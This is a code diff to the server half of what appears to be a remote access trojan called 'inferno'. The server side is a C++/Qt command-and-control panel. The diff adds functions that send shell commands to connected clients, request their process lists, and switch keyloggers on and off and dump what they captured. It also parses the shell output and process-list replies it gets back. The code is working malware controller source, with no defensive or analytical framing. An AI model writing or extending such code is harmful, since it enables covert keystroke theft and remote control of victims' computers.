@@ -151,8 +151,32 @@ void Server::processPacketBuffer(ClientContext& client) {
             client.socket.sendData(req.serialize());
 
         } else if (opcode == static_cast<uint16_t>(Opcode::CMD_RES)) {
-            emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), 
-                                   QString::fromStdString(sanitizeOutput(payload_str, 3, payload_str.size()-3)));
+            QString output = QString::fromStdString(sanitizeOutput(payload_str, 3, payload_str.size()-3));
+            if (output.isEmpty()) {
+                output = "[COMMAND COMPLETED WITH NO OUTPUT]";
+            }
+            emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
+        } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
+            // Binary Parse: [U16 Page][U8 Last][U16 Count] ... [U32 PID][U16 Len][Name]
+            if (payload.size() >= 5) {
+                uint16_t count = (static_cast<uint16_t>(payload[3]) << 8) | payload[4];
+                QString output = "\n--- REMOTE PROCESS LIST ---\nPID\tNAME\n";
+                size_t offset = 5;
+                for (uint16_t i = 0; i < count && offset + 6 <= payload.size(); ++i) {
+                    uint32_t pid = (static_cast<uint32_t>(payload[offset]) << 24) |
+                                   (static_cast<uint32_t>(payload[offset+1]) << 16) |
+                                   (static_cast<uint32_t>(payload[offset+2]) << 8) |
+                                   static_cast<uint32_t>(payload[offset+3]);
+                    uint16_t nlen = (static_cast<uint16_t>(payload[offset+4]) << 8) | payload[offset+5];
+                    offset += 6;
+                    if (offset + nlen <= payload.size()) {
+                        std::string name(reinterpret_cast<const char*>(&payload[offset]), nlen);
+                        output += QString("%1\t%2\n").arg(pid).arg(QString::fromStdString(name));
+                        offset += nlen;
+                    }
+                }
+                emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
+            }
         } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
             emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
                                QString::fromStdString(sanitizeOutput(payload_str, 12, payload_str.size()-12)));
@@ -175,6 +199,54 @@ std::string Server::sanitizeOutput(const std::string& s, size_t offset, size_t l
         }
     }
     return out;
+}
+
+void Server::sendShellCommand(const QString& ip, const QString& cmd) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            std::string cmd_str = cmd.toStdString();
+            std::string payload;
+            uint16_t len = static_cast<uint16_t>(cmd_str.size());
+            payload.push_back(static_cast<char>((len >> 8) & 0xFF));
+            payload.push_back(static_cast<char>(len & 0xFF));
+            payload.append(cmd_str);
+            
+            Packet p(static_cast<uint16_t>(Opcode::CMD_EXEC), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::requestProcessList(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Packet p(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::toggleKeylogger(const QString& ip, bool active) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Opcode op = active ? Opcode::KEYLOG_START : Opcode::KEYLOG_STOP;
+            Packet p(static_cast<uint16_t>(op), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::requestKeylogDump(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Packet p(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
 }
 
 } // namespace inferno
